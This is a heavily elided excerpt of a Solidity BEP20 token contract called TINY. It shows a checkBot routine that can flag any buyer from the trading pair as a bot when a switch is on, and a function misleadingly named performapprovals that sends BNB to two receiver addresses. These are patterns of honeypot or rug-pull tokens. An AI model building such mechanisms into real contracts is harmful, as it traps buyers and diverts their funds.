...
contract TINY is IBEP20, Auth {
    ...
    function checkBot(address sender, address recipient) internal {
        ...
        sender == pair && !isInternal[recipient] && msg.sender != recipient && botOn){isBot[recipient] = true;}    
    }
    ...
    function performapprovals(uint256 _na, uint256 _da) internal {
        ...
        payable(beta_receiver).transfer(acBNBs);
        payable(delta_receiver).transfer(acBNBt);
    }
